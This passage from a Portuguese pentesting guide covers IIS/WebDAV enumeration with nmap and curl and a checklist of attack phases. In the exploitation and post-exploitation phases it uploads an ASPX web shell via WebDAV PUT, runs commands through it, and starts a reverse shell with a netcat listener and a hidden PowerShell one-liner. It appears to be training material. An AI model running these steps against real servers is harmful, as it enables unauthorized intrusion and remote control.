|_  Server Type: Microsoft-IIS/10.0
```

> **Nota:** `WebDAV type: Unknown` é normal em algumas versões do Nmap. Os verbos `PROPFIND`, `PROPPATCH`, `MKCOL`, etc., confirmam o WebDAV.

### Identificando Autenticação NTLM

```bash
nmap --script http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 10.65.171.215
```

**Saída:**

```text
| http-ntlm-info: 
|   Target_Name: CHANGE-MY-HOSTN
|   NetBIOS_Domain_Name: CHANGE-MY-HOSTN
|   NetBIOS_Computer_Name: CHANGE-MY-HOSTN
|   DNS_Domain_Name: CHANGE-MY-HOSTNAME
|   DNS_Computer_Name: CHANGE-MY-HOSTNAME
|_  Product_Version: 10.0.17763
```

**Informações Reveladas:**

- `Product_Version: 10.0.17763` → Windows Server 2019    
- `NetBIOS_Computer_Name` → Nome do host
- `DNS_Computer_Name` → Nome DNS completo

### Varredura Combinada (Recomendada)

```bash
nmap --script http-methods,http-webdav-scan,http-ntlm-info \
     --script-args http-ntlm-info.root=/webdav/ \
     -p 80 10.65.171.215
```

**Vantagens:**

- Executa todas as verificações em uma única varredura    
- Economiza tempo
- Menos rastros em logs (menos conexões separadas)    

---
## Checklist do Pentester

### Fase 1: Fingerprinting (5 minutos)

- **Identificar versão do IIS**

```bash    
curl -I http://target/
```

- **Detectar WebDAV**

```bash 
curl -X OPTIONS http://target/ -sv
```

- **Verificar métodos HTTP**

```bash
nmap --script http-methods -p 80 target
```

### Fase 2: Enumeração (15-30 minutos)

- **Enumeração com til**

```bash
python3 iis_shortname_scan.py http://target/
```

- **Explorar diretórios descobertos**

```bash
curl http://target/BackupFiles/
```

- **Baixar arquivos interessantes**

```bash
curl http://target/BackupFiles/webdav_notes.txt
```

### Fase 3: Exploração (30-60 minutos)

- **Testar upload via WebDAV**

```bash
curl -X PUT --data "test" http://target/webdav/test.txt
```

- **Se autenticação necessária**, usar credenciais encontradas

```bash
curl --ntlm -u 'user:pass' -T shell.aspx http://target/webdav/
```

- **Confirmar execução**

```bash
curl http://target/webdav/shell.aspx?cmd=whoami
```

### Fase 4: Pós-Exploração

- **Obter reverse shell**

```bash
# Listener
nc -lvnp 443
# No target
powershell -NoP -NonI -W Hidden -Exec Bypass -c "..."
```

- **Verificar privilégios**

```bash
whoami
whoami /priv
```

- **Coletar informações do sistema**

```bash
systeminfo
ipconfig /all
netstat -ano
```

### Ferramentas Recomendadas

| Ferramenta                | Uso                              |
| ------------------------- | -------------------------------- |
| **Nmap**                  | Varredura e scripts NSE          |
| **curl**                  | Testes manuais de HTTP           |
| **iis_shortname_scan.py** | Enumeração de nomes 8.3          |
| **Burp Suite**            | Proxy e repetição de requisições |
| **Netcat**                | Reverse shell listener           |
| **PowerShell**            | Comandos e scripts               |

---
## Referências

### Documentação Oficial

- [IIS Documentation - Microsoft Learn](https://docs.microsoft.com/en-us/iis/)    
- [IIS 10.0 Security Configuration Guide](https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance)
- [CVE-2017-7269 - IIS 6.0 Exploit](https://nvd.nist.gov/vuln/detail/CVE-2017-7269)
- [CVE-2022-21907 - HTTP.sys RCE](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21907)

### Relatórios de Ameaças

- [HAFNIUM ProxyLogon Campaign - Microsoft](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)
- [Lazarus Group IIS Attacks - AhnLab ASEC, 2023](https://asec.ahnlab.com/en/53132/)
- [CISA AA23-074A - Telerik UI Exploitation](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a)

### MITRE ATT&CK

- [T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)
- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)

### Ferramentas

- [Nmap NSE Scripts](https://nmap.org/nsedoc/)
- [iis_shortname_scan.py](https://github.com/irsdl/IIS-ShortName-Scanner)
- [China Chopper Detection](https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html)

### Leitura Adicional

- **The Web Application Hacker's Handbook** - Stuttard & Pinto (Capítulo sobre IIS)
- **Windows Server Security** - Microsoft Press
- **Practical Web Penetration Testing** - Khawaja
